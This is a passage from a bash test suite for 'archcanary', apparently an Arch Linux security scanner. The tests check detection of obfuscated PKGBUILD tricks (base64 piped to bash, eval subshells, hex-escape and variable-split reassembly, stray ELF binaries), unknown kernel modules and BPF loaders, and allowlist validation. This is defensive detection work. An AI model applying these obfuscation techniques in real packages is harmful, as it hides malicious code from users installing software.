    rm -f "$allow_file5"
}

# ---------------------------------------------------------------------------
# Test 12: check_pkgbuild_caches hardened obfuscation patterns
# ---------------------------------------------------------------------------
test_pkgbuild_obfuscation() {
    local fixtures="$SCRIPT_DIR/fake_pkgbuilds"
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-pkgbuild --no-notify
    )
    local out rc=0

    # Sub-test A: base64 -d | bash → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-base64" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"base64"* ]]; then
        pass "pkgbuild_obfuscation: base64-decode-to-shell detected"
    else
        fail "pkgbuild_obfuscation: base64 pattern missed, rc=$rc"
    fi

    # Sub-test B: eval $(...) → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-eval" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"eval"* ]]; then
        pass "pkgbuild_obfuscation: eval+subshell detected"
    else
        fail "pkgbuild_obfuscation: eval pattern missed, rc=$rc"
    fi

    # Sub-test C: printf hex → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-printf" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"printf"* ]]; then
        pass "pkgbuild_obfuscation: printf hex/octal detected"
    else
        fail "pkgbuild_obfuscation: printf pattern missed, rc=$rc"
    fi

    # Sub-test D: variable-split reassembly → WARNING
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-varsplit" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"variable-split"* ]]; then
        pass "pkgbuild_obfuscation: variable-split reassembly detected"
    else
        fail "pkgbuild_obfuscation: varsplit pattern missed, rc=$rc"
    fi

    # Sub-test E: clean PKGBUILD → no WARNING (includes a standard
    # `read -d $'\0'` NUL-delimited find -print0 loop — regression guard for
    # a real false positive reported live: a single ANSI-C-quoted delimiter
    # byte must not be flagged as hex/octal obfuscation)
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-clean" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "pkgbuild_obfuscation: clean PKGBUILD (incl. read -d \$'\\0' idiom) → no false positive"
    else
        fail "pkgbuild_obfuscation: clean PKGBUILD triggered WARNING — false positive, out: $out"
    fi

    # Sub-test G: genuine ANSI-C hex-escape obfuscation (3+ chained \xHH
    # escapes spelling out a command) must still be caught — regression
    # guard so the false-positive fix above didn't just gut the check.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-ansic" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"ANSI-C hex/octal quoting"* ]]; then
        pass "pkgbuild_obfuscation: chained hex-escape obfuscation detected"
    else
        fail "pkgbuild_obfuscation: chained hex-escape obfuscation missed, rc=$rc, out: $out"
    fi

    # Sub-test F: summary table shows the softer "REVIEW" (not "INFECTED") for
    # this check — regression guard for the INFECTED/REVIEW wording split
    # (behavior-based checks like this one are heuristic and false-positive
    # prone, unlike a package-list/hash match, so the summary shouldn't imply
    # the same certainty for both).
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-base64" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --no-color 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"REVIEW"* && "$out" != *"INFECTED"* ]]; then
        pass "pkgbuild_obfuscation: summary shows REVIEW, not INFECTED"
    else
        fail "pkgbuild_obfuscation: expected REVIEW wording in summary, rc=$rc, out: $out"
    fi

    # Sub-test H: ELF binary sitting directly next to PKGBUILD (committed to
    # the package's own cache/git tree) → WARNING + inspect hint
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-elf" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: undocumented ELF binary in"* && \
          "$out" == *"helper-bin"* && \
          "$out" == *"inspect before building"* ]]; then
        pass "pkgbuild_obfuscation: undocumented ELF binary next to PKGBUILD detected"
    else
        fail "pkgbuild_obfuscation: ELF-next-to-PKGBUILD not detected, rc=$rc, out: $out"
    fi

    # Sub-test I: ELF binary under src/ (expected build-output location) →
    # NOT flagged — regression guard against false positives on ordinary
    # source downloads/build artifacts.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-elf-buildoutput" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* && "$out" != *"ELF"* ]]; then
        pass "pkgbuild_obfuscation: ELF under src/ not flagged"
    else
        fail "pkgbuild_obfuscation: ELF under src/ incorrectly flagged, rc=$rc, out: $out"
    fi

    # Sub-test J: symlink (not a plain file) committed next to PKGBUILD,
    # pointing at an ELF binary → still WARNING. Regression guard for a
    # real gap found in code review: plain `find -type f` excludes symlinks
    # (type l), so a symlinked ELF evaded Sub-test H's detection entirely
    # until `find -L` was added.
    rc=0
    out=$(PKGBUILD_CACHE_DIRS="$fixtures/pkg-elf-symlink" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: undocumented ELF binary in"* && "$out" == *"helper-bin"* ]]; then
        pass "pkgbuild_obfuscation: symlinked ELF binary next to PKGBUILD detected"
    else
        fail "pkgbuild_obfuscation: symlinked ELF binary not detected, rc=$rc, out: $out"
    fi
}

# ---------------------------------------------------------------------------
# Test 13: check_kmod — unknown module detection via mocked lsmod
# ---------------------------------------------------------------------------
test_check_kmod() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-kmod --no-notify
    )
    local out rc=0

    # Helper: create a script that outputs fixed content
    make_cmd_script() {
        local script content
        script=$(mktemp); content="$1"
        printf '#!/bin/sh\nprintf "%%s" "%s"\n' "$content" > "$script"
        chmod +x "$script"; echo "$script"
    }

    local null_dkms
    null_dkms=$(make_cmd_script "")

    # Sub-test A: lsmod with an unknown module → WARNING (exit 2)
    local lsmod_evil
    lsmod_evil=$(make_cmd_script "$(printf 'Module                  Size  Used by\nevil_rootkit_kmod      65536  0\n')")

    rc=0
    out=$(LSMOD_CMD="$lsmod_evil" DKMS_CMD="$null_dkms" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* && "$out" == *"evil_rootkit_kmod"* ]]; then
        pass "check_kmod: unknown module → WARNING (exit 2) with name listed"
    else
        fail "check_kmod: unknown module not detected, rc=$rc"
    fi

    # Sub-test B: empty lsmod + empty dkms → clean
    local lsmod_empty
    lsmod_empty=$(make_cmd_script "$(printf 'Module                  Size  Used by\n')")

    rc=0
    out=$(LSMOD_CMD="$lsmod_empty" DKMS_CMD="$null_dkms" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_kmod: empty lsmod/dkms → clean"
    else
        fail "check_kmod: empty lsmod/dkms → expected clean, got: $out"
    fi

    rm -f "$null_dkms" "$lsmod_evil" "$lsmod_empty"
}

# ---------------------------------------------------------------------------
# Test 14: check_bpftool — unknown LSM loader detection + allowlist
# ---------------------------------------------------------------------------
test_check_bpftool_allowlist() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-bpftool --no-notify
    )
    local out rc=0

    # A real, long-running, non-pacman-owned binary so /proc/<pid>/exe
    # resolves to something `pacman -Qo` genuinely doesn't own.
    local tmpdir loader_bin loader_pid
    tmpdir=$(mktemp -d)
    loader_bin="$tmpdir/test-loader"
    cp "$(command -v sleep)" "$loader_bin"
    "$loader_bin" 30 &
    loader_pid=$!
    sleep 0.3

    local fake_bpftool
    fake_bpftool=$(mktemp)
    cat > "$fake_bpftool" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
5: lsm  name my_hook  tag 1234567890abcdef  gpl
        loaded_at 2026-07-03T12:00:00+0200  uid 0
        xlated 100B  jited 100B  memlock 4096B
        pids test-loader($loader_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool"

    # Sub-test A: unknown non-pacman LSM loader, no allowlist → WARNING (exit 1)
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"WARNING"* && "$out" == *"test-loader"* ]]; then
        pass "check_bpftool: unknown lsm loader → WARNING (exit 1)"
    else
        fail "check_bpftool: unknown lsm loader → expected WARNING+exit1, got rc=$rc, out: $out"
    fi

    # Sub-test B: same loader, allowlisted by basename → INFO only, exit 0
    local allow_file
    allow_file=$(mktemp)
    printf 'test-loader\n' > "$allow_file"
    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool" BPFTOOL_ALLOWLIST_FILE="$allow_file" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_bpftool: allowlisted lsm loader → INFO only, exit 0 (clean)"
    else
        fail "check_bpftool: allowlisted lsm loader → expected INFO+exit0, got rc=$rc, out: $out"
    fi

    kill "$loader_pid" 2>/dev/null || true
    wait "$loader_pid" 2>/dev/null || true
    rm -f "$fake_bpftool" "$allow_file"
    rm -rf "$tmpdir"
}

# ---------------------------------------------------------------------------
# Test 15: _bundled_list_path falls back to the system-lib dir when the
#          running script has no bundled data files next to it (the
#          /usr/bin/archcanary packaged layout — only /usr/lib/archcanary/
#          carries the bundled lists, not /usr/bin/).
# ---------------------------------------------------------------------------
test_bundled_list_path_usr_bin_layout() {
    local isolated_bin sys_lib fake_home
    isolated_bin=$(mktemp -d)
    sys_lib=$(mktemp -d)
    fake_home=$(mktemp -d)

    cp "$REPO_DIR/archcanary.sh" "$isolated_bin/archcanary.sh"
    chmod +x "$isolated_bin/archcanary.sh"
    cp "$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" "$sys_lib/malicious_npm_packages.txt"

    local out rc=0
    out=$(HOME="$fake_home" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYSTEM_LIB="$sys_lib" \
        "$isolated_bin/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --no-notify 2>&1) || rc=$?

    if [[ "$out" == *"Packages checked:"* && "$out" != *"Malicious npm package list not found"* ]]; then
        pass "bundled_list_path: /usr/bin-style layout resolves npm list via system-lib fallback"
    else
        fail "bundled_list_path: expected fallback resolution to succeed, got: $out"
    fi

    rm -rf "$isolated_bin" "$sys_lib" "$fake_home"
}

# ---------------------------------------------------------------------------
# RESULT banner wording — regression coverage for a real report: a scan
# where every check that ran was clean, and the only reason for a non-zero
# exit code was an optional/root-only check being skipped, still printed
# the same "RESULT: WARNINGS" banner as a genuine finding. Confusingly
# alarming for what amounts to "nothing wrong, just incomplete."
# ---------------------------------------------------------------------------
test_result_banner_skip_only_wording() {
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --no-notify --no-color
    )
    local out rc=0

    # Sub-test A: nothing found, but a check was skipped (needs root) —
    # banner must say CLEAN (INCOMPLETE), not WARNINGS.
    rc=0
    out=$("$REPO_DIR/archcanary.sh" "${base_args[@]}" --check-lynis 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"RESULT: CLEAN (INCOMPLETE)"* && "$out" != *"RESULT: WARNINGS"* ]]; then
        pass "result_banner: skip-only exit 1 shows CLEAN (INCOMPLETE), not WARNINGS"
    else
        fail "result_banner: expected CLEAN (INCOMPLETE) wording, rc=$rc, out: $out"
    fi

    # Sub-test B: a real code-1 finding (unknown bpftool LSM loader) must
    # still say WARNINGS — the softer wording must not mask an actual hit.
    local tmpdir loader_bin loader_pid fake_bpftool
    tmpdir=$(mktemp -d)
    loader_bin="$tmpdir/test-loader"
    cp "$(command -v sleep)" "$loader_bin"
    "$loader_bin" 30 &
    loader_pid=$!
    sleep 0.3
    fake_bpftool=$(mktemp)
    cat > "$fake_bpftool" <<SCRIPT
#!/bin/sh
if [ "\$1" = "prog" ]; then
  cat <<PROGS
5: lsm  name my_hook  tag 1234567890abcdef  gpl
        loaded_at 2026-07-03T12:00:00+0200  uid 0
        xlated 100B  jited 100B  memlock 4096B
        pids test-loader($loader_pid)
PROGS
fi
SCRIPT
    chmod +x "$fake_bpftool"

    rc=0
    out=$(BPFTOOL_CMD="$fake_bpftool" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --check-bpftool 2>&1) || rc=$?
    kill "$loader_pid" 2>/dev/null || true
    rm -rf "$tmpdir" "$fake_bpftool"
    if [[ $rc -eq 1 && "$out" == *"RESULT: WARNINGS"* && "$out" != *"CLEAN (INCOMPLETE)"* ]]; then
        pass "result_banner: real code-1 finding still shows WARNINGS"
    else
        fail "result_banner: real finding should still say WARNINGS, rc=$rc, out: $out"
    fi
}

# ---------------------------------------------------------------------------
# --doctor: stale user-level bash completion silently shadowing a correct
# system-level one — reported live (bash's dynamic loader checks the user
# completions dir first, so a plain install done once and never repeated
# after switching to --system/package installs leaves the wrong flags
# completing forever, with no obvious symptom).
# ---------------------------------------------------------------------------
test_doctor_stale_completion() {
    local fake_home out
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.local/share/bash-completion/completions" "$fake_home/.config/archcanary"

    local sys_completion
    sys_completion=$(mktemp)
    printf 'system version content\n' > "$sys_completion"

    # Sub-test A: user copy differs from system copy → WARN with the exact
    # fix command.
    printf 'stale user version content\n' > "$fake_home/.local/share/bash-completion/completions/archcanary"
    out=$(HOME="$fake_home" XDG_DATA_HOME="$fake_home/.local/share" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYS_COMPLETION="$sys_completion" \
        "$REPO_DIR/archcanary.sh" --doctor=user 2>&1) || true
    if [[ "$out" == *"bash completion (user copy differs from system copy)"* && "$out" == *"install.sh"* ]]; then
        pass "doctor: stale user completion copy detected, fix hint present"
    else
        fail "doctor: expected stale-completion WARN, out: $out"
    fi

    # Sub-test B: user copy matches system copy → no warning.
    cp "$sys_completion" "$fake_home/.local/share/bash-completion/completions/archcanary"
    out=$(HOME="$fake_home" XDG_DATA_HOME="$fake_home/.local/share" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYS_COMPLETION="$sys_completion" \
        "$REPO_DIR/archcanary.sh" --doctor=user 2>&1) || true
    if [[ "$out" != *"bash completion"* ]]; then
        pass "doctor: matching completion copies → no false positive"
    else
        fail "doctor: in-sync completion copies should not warn, out: $out"
    fi

    # Sub-test C: only the user copy exists (plain install, no --system ever
    # run) → nothing to shadow, no warning.
    out=$(HOME="$fake_home" XDG_DATA_HOME="$fake_home/.local/share" XDG_CONFIG_HOME="$fake_home/.config" \
        ARCHCANARY_SYS_COMPLETION="/nonexistent-sys-completion-xyz" \
        "$REPO_DIR/archcanary.sh" --doctor=user 2>&1) || true
    if [[ "$out" != *"bash completion"* ]]; then
        pass "doctor: user-only install (no system copy) → no false positive"
    else
        fail "doctor: user-only completion copy should not warn, out: $out"
    fi

    rm -rf "$fake_home"
    rm -f "$sys_completion"
}

# ---------------------------------------------------------------------------
# --doctor's yay init.lua staleness check — regression coverage for the same
# drift class as test_doctor_stale_completion, but for
# ~/.config/yay/init.lua. install.sh never overwrites an existing init.lua
# (see docs/my-setup.md, "yay 13.0 integration"), so a user who adopted the
# hooks before a later archcanary release changed them would otherwise never
# be told their copy is behind.
# ---------------------------------------------------------------------------
test_doctor_stale_yay_init() {
    local fake_home out

    # Sub-test A: current version marker present -> OK, no warning.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/yay"
    cp "$REPO_DIR/configs/yay-init.lua" "$fake_home/.config/yay/init.lua"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"[ OK ]  yay init.lua"* && "$out" != *"outdated"* ]]; then
        pass "doctor: current yay init.lua marker -> OK, no false positive"
    else
        fail "doctor: expected OK for current yay init.lua, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test B: an older, unversioned marker (pre-(vN) convention) -> WARN
    # with the exact re-copy fix command.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config/yay"
    sed 's/ (v2)\.$/./' "$REPO_DIR/configs/yay-init.lua" > "$fake_home/.config/yay/init.lua"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"yay init.lua"*"(outdated)"* && "$out" == *"cp "*"configs/yay-init.lua"* ]]; then
        pass "doctor: outdated yay init.lua marker -> WARN with fix hint"
    else
        fail "doctor: expected outdated-yay-init WARN, out: $out"
    fi
    rm -rf "$fake_home"

    # Sub-test C: no init.lua at all (not a yay user, or never adopted the
    # hooks) -> optional, not a failure.
    fake_home=$(mktemp -d)
    mkdir -p "$fake_home/.config"
    out=$(XDG_CONFIG_HOME="$fake_home/.config" "$REPO_DIR/archcanary.sh" --doctor=external 2>&1) || true
    if [[ "$out" == *"[OPT ]  yay init.lua"* ]]; then
        pass "doctor: missing yay init.lua -> optional, no false positive"
    else
        fail "doctor: expected OPT for missing yay init.lua, out: $out"
    fi
    rm -rf "$fake_home"
}

# ---------------------------------------------------------------------------
# _allowlist_cli value validation — regression coverage for the bug found
# 2026-08-02: the value regex required the first char to be alphanumeric
# and never allowed '/', so a real full-path autostart value (as required by
# check_autostart's unowned-ExecStart-binary allowlisting, added earlier the
# same day) was rejected outright with "invalid allowlist value" before ever
# reaching the root check. Neither the CLI verbs nor lib/archcanary-root-helper
# (which duplicates the same regex as the actual polkit privilege boundary)
# had any test coverage before this.
# ---------------------------------------------------------------------------
test_allowlist_cli() {
    local out rc

    # A: full-path autostart value must pass validation — run as the current
    # (non-root) user and assert the failure is the ROOT check, not
    # "invalid allowlist value". That proves validation let it through.
    local auto_file
    auto_file=$(mktemp)
    rc=0
    out=$(AUTOSTART_ALLOWLIST_FILE="$auto_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add=autostart:/usr/bin/mabox-logo 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"requires root"* && "$out" != *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: full-path autostart value passes validation"
    else
        fail "allowlist_cli: full-path value wrongly rejected, rc=$rc, out: $out"
    fi

    # B: a bare name (the pre-existing dkms/systemd/bpftool case) must still
    # pass validation too — regression guard against the widened regex
    # accidentally breaking the original bare-name path.
    local dkms_file
    dkms_file=$(mktemp)
    rc=0
    out=$(DKMS_ALLOWLIST_FILE="$dkms_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add=dkms:v4l2loopback 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"requires root"* && "$out" != *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: bare-name dkms value still passes validation"
    else
        fail "allowlist_cli: bare-name value wrongly rejected, rc=$rc, out: $out"
    fi
    rm -f "$dkms_file"

    # C: a value containing a space must still be rejected — the widened
    # regex must not have accidentally loosened validation beyond '/'.
    rc=0
    out=$(AUTOSTART_ALLOWLIST_FILE="$auto_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add="autostart:has space" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: value with a space still rejected"
    else
        fail "allowlist_cli: value with a space should be rejected, rc=$rc, out: $out"
    fi

    # D: a value containing ':' must still be rejected (would get mis-split
    # by the IFS=: multi-value join when the file is later loaded).
    rc=0
    out=$(AUTOSTART_ALLOWLIST_FILE="$auto_file" \
        "$REPO_DIR/archcanary.sh" --allowlist-add="autostart:has:colon" 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"invalid allowlist value"* ]]; then
        pass "allowlist_cli: value with a colon still rejected"
    else
        fail "allowlist_cli: value with a colon should be rejected, rc=$rc, out: $out"
    fi

    rm -f "$auto_file"
}

# ---------------------------------------------------------------------------
# Run all tests
# ---------------------------------------------------------------------------
echo "=== Matching Tests ==="

$VERBOSE && msg ""

$VERBOSE && msg "--- Test 1: suffix_ambiguity ---"
test_suffix_ambiguity

$VERBOSE && msg "--- Test 2: substring ---"
test_substring

$VERBOSE && msg "--- Test 3: empty_list ---"
test_empty_list

$VERBOSE && msg "--- Test 4: comments_parsing ---"
test_comments_parsing

$VERBOSE && msg "--- Test 5: specials ---"
test_specials

$VERBOSE && msg "--- Test 6: cli_flag (--package-list) ---"
test_cli_flag

$VERBOSE && msg "--- Test 7: npm_cli_flag (--malicious-npm-list) ---"
test_npm_cli_flag

$VERBOSE && msg "--- Test 8: actual_list_integrity ---"
test_actual_list_integrity

$VERBOSE && msg "--- Test 9: check_ldso ---"
test_check_ldso

$VERBOSE && msg "--- Test 10: check_systemd hardened ---"
test_check_systemd_hardened

$VERBOSE && msg "--- Test 11: check_autostart ---"
test_check_autostart

$VERBOSE && msg "--- Test 12: pkgbuild_obfuscation ---"
test_pkgbuild_obfuscation

$VERBOSE && msg "--- Test 13: check_kmod ---"
test_check_kmod

$VERBOSE && msg "--- Test 14: check_bpftool allowlist ---"
test_check_bpftool_allowlist

$VERBOSE && msg "--- Test 15: bundled_list_path /usr/bin layout ---"
test_bundled_list_path_usr_bin_layout

$VERBOSE && msg "--- Test 16: allowlist_cli value validation ---"
test_allowlist_cli

$VERBOSE && msg "--- Test 17: RESULT banner skip-only wording ---"
test_result_banner_skip_only_wording

$VERBOSE && msg "--- Test 18: doctor stale bash completion detection ---"
test_doctor_stale_completion

$VERBOSE && msg "--- Test 19: doctor stale yay init.lua detection ---"
test_doctor_stale_yay_init

echo "=== Results: $PASS_COUNT PASS, $FAIL_COUNT FAIL ==="
[[ $FAIL_COUNT -eq 0 ]] || exit 1
